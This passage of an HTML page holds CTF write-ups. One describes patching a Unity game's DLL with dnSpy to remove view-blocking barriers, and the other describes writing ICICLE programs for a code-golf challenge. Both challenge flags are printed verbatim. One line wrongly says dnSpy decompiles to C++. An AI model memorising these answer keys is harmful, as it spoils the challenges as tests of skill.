+          <p>For this one, we were given a Unity game. Launching this game shows us the first few character of the flag at the end of a hallway, but getting too close brings up a barrier that prevents us from reading the whole flag. To try and get the flag, I thought there were two ways  I could do it. I could either reverse the game code to change the function of the barriers or try to extract the assets and textures to get the flag. I thought the texture extraction would be easier so I attempted to do that (with many different programs), but none of them worked for some reason. I eventually gave in and decided the reverse the code and after some searching, found dnSpy, a program where I could decompile dlls into c++, edit the code, and recompile it. After finding this, I loaded <span class="pre">Assembly-CSharp.dll</span> and found the function that raises the barriers. There were multiple things you could've done at this point to stop the raising of the barriers, but I just deleted the for loop that raises them and that seemed to work fine. After I recompiled the file, I was able to launch the game and walk down the hallway to see the flag.</p>
+          <p><b>Difficulty rating:</b> 4/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br /><br />
+          <p>ICTF{ARE_YOU_WINNING_SON_GGGGG}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="medium chall">
+          <h3>ICICLE Golf</h3>
+          <p>You've spent so long writing this interpreter and solving other ICICLE challenges, it'd be a shame if you never actually coded in ICICLE! Write some simple programs. As a bonus, if you have the shortest program, I'll buy you nitro! See the readme for details.</p>
+          <h5>Attachments</h5>
+          <p><a href="https://imaginaryctf.org/r/568C-player_files.zip">https://imaginaryctf.org/r/568C-player_files.zip</a><br /><span class="pre">nc puzzler7.imaginaryctf.org 1111</span></p>
+          <h5>Category</h5>
+          <p>Programming</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>puzzler7</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>125</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>In this chall, we're given the task of completing three challenges by creating solutions in ICICLE. The first one was "cat", where it was tasked to mimick what happens when the "cat" command it typed without any arguments into a linux shell, the second one was "gcd", where it was tasked to take 2 numbers as input and output the gcd of them, and the third one was "sort", where it was tasked to take input for a length, ask for that many numbers, and then sort all those numbers and output them.</p>
+          <p><a href="/static/iciclegolf.zip" download>Here's</a> a link to download all of my scripts</p>
+          <p>For "cat", I first just tested out cat in my shell to see what it actually did and then tried to emulate that with icicle. It's kind of difficult to explain my thought process, but ICICLE is pretty easy to read, so it's not that hard to see what I was doing based on my code</p>
+          <p>For "gcd", I looked up some gcd finding algorithms and came across <a href="https://people.cs.ksu.edu//~schmidt/301s14/Exercises/euclid_alg.html" target="_blank">this article</a> with a function in c to calculator the gcd of two numbers, so I tried to replicate this code, but using ICICLE to get my solve</p>
+          <p>For "sort", I first was confused on how I was meant to gather variable amounts of user input, but then was reminded of storing numbers in memory rather than in registers by puzzler. After that, I decided to use insertion sort to sort the numbers and found <a href="https://www.geeksforgeeks.org/python-program-for-insertion-sort/" target="_blank">this website</a> with a python script to perform insertion sort. After a lot of trial and error and typos, I was able to create an ICICLE script that worked and was able to get the flag by converting all the scripts to base64 (I used CyberChef) and submitting them into the server.
+          <p><b>Difficulty rating:</b> 6/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br /><br />
+          <p>ictf{wh@ts_c00l3r_th@n_b3!ng_c00l?_ICICLE!}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+  </body>
+</html>
